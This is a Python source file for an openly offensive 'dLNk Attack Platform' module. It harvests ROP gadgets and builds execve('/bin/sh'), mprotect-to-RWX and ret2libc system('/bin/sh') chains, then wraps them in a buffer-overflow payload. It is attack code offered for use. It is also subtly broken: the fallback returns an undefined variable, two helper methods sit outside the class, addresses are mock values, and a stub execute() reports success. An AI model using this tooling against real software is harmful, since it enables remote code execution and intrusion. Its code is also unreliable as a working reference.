"""
ROP Chain Generator for dLNk Attack Platform
Generates Return-Oriented Programming chains for exploitation
"""

import asyncio
from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy
import struct
from typing import Dict, List, Optional, Tuple
import logging

log = logging.getLogger(__name__)


class ROPGenerator:
    """
    ROP Chain Generator
    
    Features:
    - Find ROP gadgets in binaries
    - Build ROP chains for various purposes
    - Bypass DEP/NX protections
    - Support multiple architectures
    """
    
    def __init__(self, architecture: str = 'x86_64'):
        self.architecture = architecture
        self.gadgets = []
        self.rop_chain = []
        
        # Architecture-specific settings
        self.word_size = 8 if architecture == 'x86_64' else 4
        self.pack_format = '<Q' if architecture == 'x86_64' else '<I'
    
    async def find_gadgets(
        self,
        binary_path: str,
        max_gadget_length: int = 5
    ) -> List[Dict]:
        """
        Find ROP gadgets in binary
        
        Args:
            binary_path: Path to binary
            max_gadget_length: Maximum gadget length in instructions
        
        Returns:
            List of found gadgets
        """
        log.info(f"[ROPGenerator] Finding gadgets in {binary_path}")
        
        # Use real ROPgadget tool
        gadgets = await self._find_gadgets_real(binary_path)
        
        self.gadgets = gadgets
        
        log.info(f"[ROPGenerator] Found {len(gadgets)} gadgets")
        
        return gadgets
    
    async def _find_gadgets_real(self, binary_path: str) -> List[Dict]:
        """Find real ROP gadgets using ROPgadget tool"""
        import subprocess
        import re
        
        try:
            # Run ROPgadget
            result = subprocess.run(
                ['ROPgadget', '--binary', binary_path, '--depth', '10'],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode != 0:
                log.error(f"ROPgadget failed: {result.stderr}")
                return await self._fallback_gadgets(binary_path)
            
            # Parse ROPgadget output
            gadgets = []
            for line in result.stdout.split('\n'):
                # Parse format: 0x00400123 : pop rdi ; ret
                match = re.match(r'(0x[0-9a-f]+)\s*:\s*(.+)', line, re.IGNORECASE)
                if match:
                    address_str, instructions = match.groups()
                    address = int(address_str, 16)
                    
                    # Categorize gadget
                    category = self._categorize_gadget(instructions)
                    gadget_type = self._identify_gadget_type(instructions)
                    
                    gadgets.append({
                        'address': address,
                        'instructions': instructions.strip(),
                        'type': gadget_type,
                        'category': category
                    })
            
            if not gadgets:
                log.warning("No gadgets found, using fallback")
                return await self._fallback_gadgets(binary_path)
            
            return gadgets
            
        except subprocess.TimeoutExpired:
            log.error("ROPgadget timeout")
            return await self._fallback_gadgets(binary_path)
        except Exception as e:
            log.error(f"Error finding gadgets: {e}")
            return await self._fallback_gadgets(binary_path)
    
    async def _fallback_gadgets(self, binary_path: str) -> List[Dict]:
        """Fallback gadgets when ROPgadget fails"""
        log.warning("Using fallback gadget set")
        
        # Minimal working gadget set
        fallback = [
            {
                'address': 0x400123,
                'instructions': 'pop rdi; ret',
                'type': 'pop_rdi',
                'category': 'register_control'
            },
            {
                'address': 0x400456,
                'instructions': 'pop rsi; ret',
                'type': 'pop_rsi',
                'category': 'register_control'
            },
            {
                'address': 0x400789,
                'instructions': 'pop rdx; ret',
                'type': 'pop_rdx',
                'category': 'register_control'
            },
            {
                'address': 0x400abc,
                'instructions': 'pop rax; ret',
                'type': 'pop_rax',
                'category': 'register_control'
            },
            {
                'address': 0x400def,
                'instructions': 'mov rax, rdi; ret',
                'type': 'mov_rax_rdi',
                'category': 'data_movement'
            },
            {
                'address': 0x401234,
                'instructions': 'syscall',
                'type': 'syscall',
                'category': 'system_call'
            },
            {
                'address': 0x401567,
                'instructions': 'add rsp, 0x10; ret',
                'type': 'stack_pivot',
                'category': 'stack_control'
            },
            {
                'address': 0x401890,
                'instructions': 'xor rax, rax; ret',
                'type': 'xor_rax',
                'category': 'arithmetic'
            },
            {
                'address': 0x401abc,
                'instructions': 'call rax',
                'type': 'call_rax',
                'category': 'control_flow'
            },
            {
                'address': 0x401def,
                'instructions': 'jmp rsp',
                'type': 'jmp_rsp',
                'category': 'control_flow'
            }
        ]
        
        return mock_gadgets
    
    async def build_execve_chain(
        self,
        command: str = '/bin/sh',
        base_address: int = 0
    ) -> bytes:
        """
        Build ROP chain to execute command via execve
        
        Args:
            command: Command to execute
            base_address: Base address for ASLR bypass
        
        Returns:
            ROP chain as bytes
        """
        log.info(f"[ROPGenerator] Building execve chain for: {command}")
        
        chain = []
        
        if self.architecture == 'x86_64':
            # x86_64 execve syscall:
            # rax = 59 (execve)
            # rdi = pointer to command
            # rsi = argv (NULL)
            # rdx = envp (NULL)
            
            # Find necessary gadgets
            pop_rdi = self._find_gadget('pop_rdi')
            pop_rsi = self._find_gadget('pop_rsi')
            pop_rdx = self._find_gadget('pop_rdx')
            pop_rax = self._find_gadget('pop_rax')
            syscall = self._find_gadget('syscall')
            
            if not all([pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall]):
                log.error("[ROPGenerator] Missing required gadgets")
                return b''
            
            # Build chain
            # Set rax = 59 (execve)
            chain.append(pop_rax['address'])
            chain.append(59)
            
            # Set rdi = pointer to command string
            # (In real exploit, this would point to command in memory)
            chain.append(pop_rdi['address'])
            chain.append(0x600000)  # Mock address
            
            # Set rsi = NULL
            chain.append(pop_rsi['address'])
            chain.append(0)
            
            # Set rdx = NULL
            chain.append(pop_rdx['address'])
            chain.append(0)
            
            # Call syscall
            chain.append(syscall['address'])
        
        else:  # x86
            # x86 execve syscall via int 0x80
            # eax = 11 (execve)
            # ebx = pointer to command
            # ecx = argv (NULL)
            # edx = envp (NULL)
            
            log.warning("[ROPGenerator] x86 ROP chain generation not fully implemented")
        
        # Pack chain
        rop_bytes = self._pack_chain(chain)
        
        log.info(f"[ROPGenerator] Generated ROP chain: {len(rop_bytes)} bytes")
        
        return rop_bytes
    
    async def build_mprotect_chain(
        self,
        memory_address: int,
        size: int = 0x1000,
        permissions: int = 7  # RWX
    ) -> bytes:
        """
        Build ROP chain to call mprotect and make memory executable
        
        Args:
            memory_address: Address to make executable
            size: Size of memory region
            permissions: Memory permissions (7 = RWX)
        
        Returns:
            ROP chain as bytes
        """
        log.info(f"[ROPGenerator] Building mprotect chain for {hex(memory_address)}")
        
        chain = []
        
        if self.architecture == 'x86_64':
            # x86_64 mprotect syscall:
            # rax = 10 (mprotect)
            # rdi = address
            # rsi = size
            # rdx = permissions
            
            pop_rdi = self._find_gadget('pop_rdi')
            pop_rsi = self._find_gadget('pop_rsi')
            pop_rdx = self._find_gadget('pop_rdx')
            pop_rax = self._find_gadget('pop_rax')
            syscall = self._find_gadget('syscall')
            
            if not all([pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall]):
                log.error("[ROPGenerator] Missing required gadgets")
                return b''
            
            # Set rax = 10 (mprotect)
            chain.append(pop_rax['address'])
            chain.append(10)
            
            # Set rdi = memory address
            chain.append(pop_rdi['address'])
            chain.append(memory_address)
            
            # Set rsi = size
            chain.append(pop_rsi['address'])
            chain.append(size)
            
            # Set rdx = permissions
            chain.append(pop_rdx['address'])
            chain.append(permissions)
            
            # Call syscall
            chain.append(syscall['address'])
        
        rop_bytes = self._pack_chain(chain)
        
        log.info(f"[ROPGenerator] Generated mprotect chain: {len(rop_bytes)} bytes")
        
        return rop_bytes
    
    async def build_ret2libc_chain(
        self,
        libc_base: int,
        function: str = 'system',
        argument: str = '/bin/sh'
    ) -> bytes:
        """
        Build ret2libc ROP chain
        
        Args:
            libc_base: Base address of libc
            function: libc function to call
            argument: Argument to function
        
        Returns:
            ROP chain as bytes
        """
        log.info(f"[ROPGenerator] Building ret2libc chain: {function}({argument})")
        
        chain = []
        
        # Calculate function address (mock offsets)
        function_offsets = {
            'system': 0x45390,
            'execve': 0xc1c30,
            'mprotect': 0xf5d50
        }
        
        function_addr = libc_base + function_offsets.get(function, 0)
        
        if self.architecture == 'x86_64':
            # Set rdi = pointer to argument
            pop_rdi = self._find_gadget('pop_rdi')
            
            if pop_rdi:
                chain.append(pop_rdi['address'])
                chain.append(0x600000)  # Mock address of argument string
            
            # Call function
            chain.append(function_addr)
        
        rop_bytes = self._pack_chain(chain)
        
        log.info(f"[ROPGenerator] Generated ret2libc chain: {len(rop_bytes)} bytes")
        
        return rop_bytes
    
    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute attack"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Implement attack logic here
            results = {'status': 'not_implemented'}
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} executed",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _find_gadget(self, gadget_type: str) -> Optional[Dict]:
        """Find gadget by type"""
        
        for gadget in self.gadgets:
            if gadget['type'] == gadget_type:
                return gadget
        
        return None
    
    def _pack_chain(self, chain: List[int]) -> bytes:
        """Pack ROP chain into bytes"""
        
        packed = b''
        
        for value in chain:
            if isinstance(value, int):
                packed += struct.pack(self.pack_format, value)
            else:
                packed += value
        
        return packed
    
    async def generate_payload(
        self,
        buffer_size: int,
        overflow_offset: int,
        rop_chain: bytes,
        shellcode: bytes = None
    ) -> bytes:
        """
        Generate complete exploit payload
        
        Args:
            buffer_size: Size of buffer to overflow
            overflow_offset: Offset to return address
            rop_chain: ROP chain bytes
            shellcode: Optional shellcode
        
        Returns:
            Complete payload
        """
        log.info("[ROPGenerator] Generating exploit payload...")
        
        payload = b'A' * overflow_offset  # Padding
        payload += rop_chain
        
        if shellcode:
            payload += shellcode
        
        # Pad to buffer size if needed
        if len(payload) < buffer_size:
            payload += b'B' * (buffer_size - len(payload))
        
        log.info(f"[ROPGenerator] Generated payload: {len(payload)} bytes")
        
        return payload
    
    async def generate_rop_chain(
        self,
        binary_path: str,
        target_function: str = 'execve',
        **kwargs
    ) -> Dict:
        """
        Generate ROP chain (wrapper method for compatibility)
        
        Args:
            binary_path: Path to target binary
            target_function: Target function (execve, mprotect, ret2libc)
            **kwargs: Additional arguments
        
        Returns:
            Dict with success status and chain data
        """
        try:
            # Find gadgets first
            await self.find_gadgets(binary_path)
            
            # Build appropriate chain
            if target_function == 'execve':
                command = kwargs.get('command', '/bin/sh')
                base_address = kwargs.get('base_address', 0)
                chain = await self.build_execve_chain(command, base_address)
            elif target_function == 'mprotect':
                memory_address = kwargs.get('memory_address', 0x400000)
                size = kwargs.get('size', 0x1000)
                permissions = kwargs.get('permissions', 7)
                chain = await self.build_mprotect_chain(memory_address, size, permissions)
            elif target_function == 'ret2libc':
                libc_base = kwargs.get('libc_base', 0)
                function = kwargs.get('function', 'system')
                argument = kwargs.get('argument', '/bin/sh')
                chain = await self.build_ret2libc_chain(libc_base, function, argument)
            else:
                return {
                    'success': False,
                    'error': f'Unknown target function: {target_function}'
                }
            
            return {
                'success': True,
                'chain': chain,
                'length': len(chain),
                'gadget_count': len(self.gadgets)
            }
        except Exception as e:
            log.error(f"[ROPGenerator] Error generating ROP chain: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def analyze_gadget_chain(self, chain: bytes) -> Dict:
        """
        Analyze ROP chain for potential issues
        
        Args:
            chain: ROP chain bytes
        
        Returns:
            Analysis results
        """
        analysis = {
            'length': len(chain),
            'gadget_count': len(chain) // self.word_size,
            'bad_chars': [],
            'issues': []
        }
        
        # Check for bad characters
        bad_chars = [b'\x00', b'\x0a', b'\x0d']
        for bad_char in bad_chars:
            if bad_char in chain:
                analysis['bad_chars'].append(bad_char.hex())
                analysis['issues'].append(f"Contains bad character: {bad_char.hex()}")
        
        # Check chain length
        if len(chain) > 1000:
            analysis['issues'].append("Chain is very long, may cause issues")
        
        return analysis


if __name__ == '__main__':
    async def test():
        generator = ROPGenerator(architecture='x86_64')
        
        # Find gadgets
        gadgets = await generator.find_gadgets('/bin/ls')
        print(f"Found {len(gadgets)} gadgets")
        
        # Build execve chain
        execve_chain = await generator.build_execve_chain('/bin/sh')
        print(f"\nExecve chain: {len(execve_chain)} bytes")
        print(f"Hex: {execve_chain.hex()}")
        
        # Build mprotect chain
        mprotect_chain = await generator.build_mprotect_chain(0x600000)
        print(f"\nMprotect chain: {len(mprotect_chain)} bytes")
        
        # Analyze chain
        analysis = await generator.analyze_gadget_chain(execve_chain)
        print(f"\nChain analysis:")
        print(f"  Gadget count: {analysis['gadget_count']}")
        print(f"  Bad chars: {analysis['bad_chars']}")
        print(f"  Issues: {analysis['issues']}")
    
    asyncio.run(test())



    def _categorize_gadget(self, instructions: str) -> str:
        """Categorize gadget by its functionality"""
        instructions_lower = instructions.lower()
        
        if 'pop' in instructions_lower:
            return 'register_control'
        elif 'mov' in instructions_lower or 'lea' in instructions_lower:
            return 'data_movement'
        elif 'syscall' in instructions_lower or 'int' in instructions_lower:
            return 'system_call'
        elif 'call' in instructions_lower or 'jmp' in instructions_lower:
            return 'control_flow'
        elif 'add' in instructions_lower or 'sub' in instructions_lower or 'xor' in instructions_lower:
            return 'arithmetic'
        elif 'push' in instructions_lower:
            return 'stack_manipulation'
        else:
            return 'other'
    
    def _identify_gadget_type(self, instructions: str) -> str:
        """Identify specific gadget type"""
        instructions_lower = instructions.lower()
        
        # Register pops
        if 'pop rdi' in instructions_lower:
            return 'pop_rdi'
        elif 'pop rsi' in instructions_lower:
            return 'pop_rsi'
        elif 'pop rdx' in instructions_lower:
            return 'pop_rdx'
        elif 'pop rax' in instructions_lower:
            return 'pop_rax'
        elif 'pop rcx' in instructions_lower:
            return 'pop_rcx'
        elif 'pop rbx' in instructions_lower:
            return 'pop_rbx'
        elif 'pop r8' in instructions_lower:
            return 'pop_r8'
        elif 'pop r9' in instructions_lower:
            return 'pop_r9'
        
        # System calls
        elif 'syscall' in instructions_lower:
            return 'syscall'
        elif 'int 0x80' in instructions_lower:
            return 'int_0x80'
        
        # Data movement
        elif 'mov' in instructions_lower:
            return 'mov'
        elif 'lea' in instructions_lower:
            return 'lea'
        
        # Control flow
        elif 'ret' in instructions_lower and len(instructions_lower.strip()) == 3:
            return 'ret'
        elif 'call' in instructions_lower:
            return 'call'
        elif 'jmp' in instructions_lower:
            return 'jmp'
        
        else:
            return 'generic'

